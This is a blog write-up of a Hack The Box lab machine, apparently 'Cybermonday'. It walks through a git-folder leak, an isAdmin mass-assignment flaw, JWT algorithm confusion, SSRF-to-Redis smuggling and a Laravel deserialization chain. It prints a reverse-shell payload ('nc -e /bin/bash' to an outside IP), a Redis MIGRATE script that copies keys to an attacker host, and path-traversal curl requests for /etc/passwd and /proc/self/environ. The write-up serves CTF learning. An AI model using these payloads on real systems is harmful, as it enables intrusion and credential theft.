---
title: Cybermonday Writeup
date: 2024-02-06 18:30:00 - 03:00
categories: [Writeup, Hackthebox]
---
### Some considerations:
> 🇬🇧 This machine it's really off the beaten track in your difficulty, what probably create a controversial rating inside the HTB community. The user have a long journey and so exaustive, then most players give up after first flag.
{: .prompt-info }

>🇧🇷 Essa máquina é realmente bem fora da curva no quesito de dificuldade, o que possivelmente criou uma avaliação controversa dentro da comunidade. O "user"tem uma jornada longa e bem exaustiva, tanto que a maioria dos jogadores para após a primeira flag.
{: .prompt-info }

### Default start:
```YAML
# Nmap 7.93 scan initiated Sat Aug 19 18:04:35 2023 as: nmap -sV -A --max-rate=10000 -Pn -oN tcp.log cybermonday.htb
Nmap scan report for cybermonday.htb (10.129.122.202)
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 7468141fa1c048e50d0a926afbc10cd8 (RSA)
|   256 f7109dc0d1f383f20525aadb080e8e4e (ECDSA)
|_  256 2f6408a9af1ac5cf0f0b9bd295f59232 (ED25519)
80/tcp open  http    nginx 1.25.1
|_http-server-header: nginx/1.25.1
|_http-title: Welcome - Cyber Monday
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
> The NMAP just have returned the default application ports. Which is really interesting, but nothing new.

```bash
sudo echo "10.129.122.202 cybermonday.htb" >> /etc/hosts
```

after handle the domain, we can see the landing page of the application:
[!Desktop View](/images/cybermonday/thumb.png)
the wappalizer just flag default simple applications, like PHP, NGINX and a css framework, which is know for can be consumed with react applications, turning up a bit interesting this combination in PHP.

At devTools, we can check for some source files in application, and just file we can found is the tailwind.js properly, but when reach in storage for see any cookies, we can found this.
![Desktop View](/images/cybermonday/devTools.png)
decoding this cookies, we have this:
![Desktop View](/images/cybermonday/cookie.png)

Researching about cookies which have this format, we can found a laravel_session cookies, which the value was encoded with a special app key, in this case, we can't see the what is the value field. It's a kind of guessing, but in next step, we can confirm it.

> The other tabs practically won't help us at moment, like a static product pages, but when scroll down to the page, we can found a register link.

![Desktop View](/images/cybermonday/login.png)

> When you log, we can see now the /home and /profile routes. At all, it's return a name of account in clear text. which can be a signal to XSS or SSTI?
{: .prompt-tip }

After test some steps in article, even with the chars pretty escaped in front, nothing happen, and the same for XSS. So i go to username field, and check some properties in front-end.

```html
<input type="text" name="username" value="123" id="first-name" autocomplete="given-name" 
class="mt-1 block w-full rounded-md border-2 border-gray-300 shadow-sm 
focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm p-2">
```

I noted that input not have any value maxLength, so i tried spam something in it.

```
msf-pattern_create -l 400
> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...
```

After some attempts, this 400 chars trigger an SQL error, which return us a debug screen.

![Desktop View](/images/cybermonday/info.png)

we also can find this queries and a git hash commit.

![Desktop View](/images/cybermonday/info2.png)
![Desktop View](/images/cybermonday/info3.png)
> but the protagonist of this page, is the stacktrace page error, as can se above.
> With this page, we can understand some snippets for application, and also can cause other failures to see other files. In this page, we can see this stacktrace was build in react, so probably is a component replacing the page which caused the error.
> Considering this framework, any injection probably is inaccurate, since the command you will see in debugger is just a client-side, and we don't know yet how and where the input values are handled. 
> I tried overflowing the chars and add some SQLi patterns after maxlength, and some second-order-SQLi, which i check the debug page after send payloads in fields. nothing of this return something useful, so just rest read more, and more snippets.

### FUZZING: WFUZZ, FFUF, SUBDOMAIN-FINDER, NUCLEI:

This was the first time i used nuclei to fuzzing or enumeration. I really don't like of most of massive scans, 'cause probably lose the mean of the process in CTF, but at this case, i think is a good idea test after so much enumeration:
![Desktop View](/images/cybermonday/fuzz.png)
> after i really tested so much wordlists, i just try a new way:
![Desktop View](/images/cybermonday/fuzz2.png)

> the .htaccess is know before, just not cited about it because I not used it effective, and the focus is in this vulnerability:
{: .prompt-info }

```
[git-config-nginxoffbyslash] [http] [medium] http://cybermonday.htb/assets../.git/config
```

Commonly, we can try exploit it with https://github.com/arthaud/git-dumper, a useful tool for this enumeration type.

```bash
python git-dumper/git_dumper.py "http://cybermonday.htb/assets../.git" /path/to/output/
```

now, inside of the repository, it's possible to check the hash already found in stacktrace.

```bash
git checkout f439e6a6
```

I didn't notice a biggest difference between commits, and the text commit is not really showy, so lets go to the application structure.

### isAdmin parameter


![Desktop View](/images/cybermonday/admin.png)
We can see in this file, User.php, a file code referring in a parameter isAdmin which is a bool in protected array. 
Following for other files, we can see "ProfileController.php", what import the "User.php" file.
![Desktop View](/images/cybermonday/admin2.png)

> the public function update in line 17, it's a process to update the user, the same saw in update profile page, but the user in line 33, is a instantiated object from the other file above from it. Maybe the request at 19 line can be manipulated to receive and parse the isAdmin argument?
{: .prompt-info }
```
POST /home/update HTTP/1.1
Host: cybermonday.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 121
Origin: http://cybermonday.htb
Connection: close
Referer: http://cybermonday.htb/home/profile
Upgrade-Insecure-Requests: 1

_token=bmBDgxDDl2EN8eeemlHkUbus6n8BeZWLcCUQmSwW&username=123&email=123%40gmail.com&password=123&password_confirmation=123&isAdmin=1
```

After it, we can explore the /dashboard route, with some graphs and other tabs in sidebar.
![Desktop View](/images/cybermonday/admin3.png)
at changelog, the following screen it showed:
![Desktop View](/images/cybermonday/admin4.png)
and checking this links, with found a new subdomain.

### Cookies, REDIS, Deserealization:

![Desktop View](/images/cybermonday/cookies1.png)

looking up  the subdomain, we can suppose that's a kind of catalog of API routes.
this is probably the most difficult part in machine at all, have a multiple and longs steps to finally trigger RCE. Considering this, I'll divide the path in three steps:
- [x] Cookies:
- [] Redis:
- [] RCE:
Starting up with cookies, we can see the api have in route catalog public routes which are made for register and login users. Following with a interesting path for dynamic webhooks, using a random uuid generated.
In guessing moment, i've found this following while i trying to create an use.

```
{"status":"error","message":"This user already exists"}
```

[!Desktop View](/images/cybermonday/cookies2.png)
[!Desktop View](/images/cybermonday/cookies3.png)

Looking for the x-access-token header value, we can note the structure is similar to JWT cookie, but maybe with more characters as the daily JWT we can found, checking this, the JWT.io changes the crypto method to RS256. (And id 2 also can guarantee about the default admin is located in the first id, considering this is autoincremental).

<https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion>

After see the community videos about this lab, we notice the "easiest" is using burp JWT editor extension, by the way, it's not always we can use burp inside of your environment. So let to CLI method. Consdering also the video path, we can call jwks.json in url to see the keys.

```
{
	"keys": [
		{
			"kty": "RSA",
			"use": "sig",
			"alg": "RS256",
			"n": "pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w",
			"e": "AQAB"
		}
	]
}
```

### JWTool:
<https://github.com/ticarpi/jwt_tool>

after long hours (Four, to be exact), i finally understand how handle the path of the burpsuite inside of this tools. It's kinda be more no intuitive, but i really think this the most cool way.

![Desktop View](/images/cybermonday/jwt1.png)
Now we have a admin session for the all API environment, which let us create some custom webhooks, called by a random UUID returned after your creation. 
After some tests, we can work around two parameters:
```
{
  "url",
  "method"
}
```
<https://blog.crowsec.com.br/ssrf-protocol-smuggling/>
<https://www.silentrobots.com/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/>
<https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery>

This is about the first attempts, which some requests through localhost and internal routes it's really more slow to respond as external routes.

![Desktop View](/images/cybermonday/jwt2.png)

> We can understand this vuln as a SSRF with CRLF smuggling inside of the "method" function, we can found reports about this type a long of time, so we can take a long time testing redis syntax, and with that, we can go to the untended way.
{: .prompt-tip }

After researching about the machine set, we can find a blog really helpful for the intended path.
<https://blog.crowsec.com.br/obtendo-rce/>

I'm realy stucked at this part, 'cause i've just forgot for the env file. After a coffee break, and some coding, i reach in this conclusion:
<https://gist.github.com/Redshifteye/048480c21bbbd4667359906bf8cc9a01>
Some tools, like the properly `phpggc` i found at common consensus at community and in this blog. And finally, we got an RCE from this way.
 
> In the env file we can found the laravel_session token more easily than through redis proccess. So many core info are stored in files.
{: .prompt-tip }

```
ruby poc.rb -a 10.10.14.8 --attacker-port 6969 -s VIJZ2GkfTiv3lPvFxUztuSeU9p8WiUV8M4eh6LgI -u http://localhost:8080/ --payload http://redis:6379
```

### Alternative:

We also can dump the `laravel_session` through redis `SlAVEOF`:

![Desktop View](/images/cybermonday/redis.png)
<https://redis.io/commands/migrate/?source=post_page-----fcf4671a6ae1-------------------------------->

```
EVAL 'for k,v in pairs(redis.call(\"KEYS\", \"*\")) do redis.pcall(\"MIGRATE\",\"10.10.14.17"\",\"6379\",v,0,10000) end' 0\r\n\r\
```
![Desktop View](/images/cybermonday/redis2.png)
![Desktop View](/images/cybermonday/redis3.png)
```
{"url":"http://redis:6379","method":"*3\r\n$3\r\nset\r\n$76\r\ncybermonday_database_cybermonday_cache_:4d453ae1-017c-46d0-9c21-6d60ab88b398\r\n$250\r\nO:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\";a:2:{i:0;O:28:\"Illuminate\\Auth\\RequestGuard\":3:{s:8:\"callback\";s:14:\"call_user_func\";s:7:\"request\";s:6:\"system\";s:8:\"provider\";s:31:\"nc -e /bin/bash 10.10.16.9 8888\";}i:1;s:4:\"user\";}} \r\nQUIT\r\n"}
```

### Lateral movimentation:
Well inside of the machine, we can go further scanning some internal services:

```
grep -v "rem_address" /proc/net/tcp  | awk  '{x=strtonum("0x"substr($3,index($3,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($3,i,2))}{print x":"strtonum("0x"substr($3,index($3,":")+1,4))}'
```
> the machine itself looks like just a container, or a service isolated for some deploy template for isolated applications. Considering this, we can pivot for this machine, and start to recon for other services.
{: .prompt-info }

![Desktop View](/images/cybermonday/redis4.png)
After that, we can simply link the rsocx to proxychains:

```
proxychains4 nmap -sV -A 172.17.0.0/24 --max-rate=1000 -oN nmap.log
...
...
...
172.18.0.4:5000
...
...
```

this part especially it's most long in all machine, since we are "stopped" for the HTB internal connection, which for my region, it's pretty slow.
This machine was launched few weeks after "RegistryTwo" so most people still sharp for docker registry challenges.

<https://github.com/Syzik/DockerRegistryGrabber>
```
proxychains4 dockergrabber.py --dump-all
```
Skipping for the moment we downloaded and open all blob files dumped, we can find the API source code, which have more interesting laravel files.

```php
<?php

namespace app\controllers;
use app\helpers\Api;
use app\models\Webhook;

class LogsController extends Api
{
    public function index($request)
    {
        $this->apiKeyAuth();

        $webhook = new Webhook;
        $webhook_find = $webhook->find("uuid", $request->uuid);

        if(!$webhook_find)
        {
            return $this->response(["status" => "error", "message" => "Webhook not found"], 404);
        }

        if($webhook_find->action != "createLogFile")
        {
            return $this->response(["status" => "error", "message" => "This webhook was not created to manage logs"], 400);
        }

        $actions = ["list", "read"];

        if(!isset($this->data->action) || empty($this->data->action))
        {
            return $this->response(["status" => "error", "message" => "\"action\" not defined"], 400);
        }

        if($this->data->action == "read")
        {
            if(!isset($this->data->log_name) || empty($this->data->log_name))
            {
                return $this->response(["status" => "error", "message" => "\"log_name\" not defined"], 400);
            }
        }

        if(!in_array($this->data->action, $actions))
        {
            return $this->response(["status" => "error", "message" => "invalid action"], 400);
        }

        $logPath = "/logs/{$webhook_find->name}/";

        switch($this->data->action)
        {
            case "list":
                $logs = scandir($logPath);
                array_splice($logs, 0, 1); array_splice($logs, 0, 1);

                return $this->response(["status" => "success", "message" => $logs]);
            
            case "read":
                $logName = $this->data->log_name;

                if(preg_match("/\.\.\//", $logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logName = str_replace(' ', '', $logName);

                if(stripos($logName, "log") === false)
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                if(!file_exists($logPath.$logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logContent = file_get_contents($logPath.$logName);

                return $this->response(["status" => "success", "message" => $logContent]);
        }
    }
}
```

![Desktop View](/images/cybermonday/redis5.png)

```
$webhook_find = $webhook->find("uuid", $request->uuid);
$logPath = "/logs/{$webhook_find->name}/";
```

```
$webhook->create([
            "name" => $this->data->name,
            "description" => $this->data->description,
            "action" => $this->data->action,
            "uuid" => $webhook_uuid->toString()
        ]);
```

After reading and interpret this files, we can found a invalidation from the regex, which manage all data. Considering this, we can explore with some LFI payloads.

```
curl -X POST http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.hsjDWoGJbgx_ygJe9nlfu4dNZHUZuF3Igy43NfKQ7aE" -H "Content-Type: application/json" -d '{"action":"read", "log_name":" .. / .. / etc / passwd"}' -X POST | json_pp
```

Considering this payload set, we can change for some sensitives proccess, which one in specific we can found the credentials inside of memory dump, and logging to the machine by SSH with correct user and got the user flag.
```
curl -X POST http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" -H "x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.hsjDWoGJbgx_ygJe9nlfu4dNZHUZuF3Igy43NfKQ7aE" -H "Content-Type: application/json" -d '{"action":"read", "log_name":" .. / .. / logs / .. / proc / self  / environ  "}' -X POST | json_pp
```
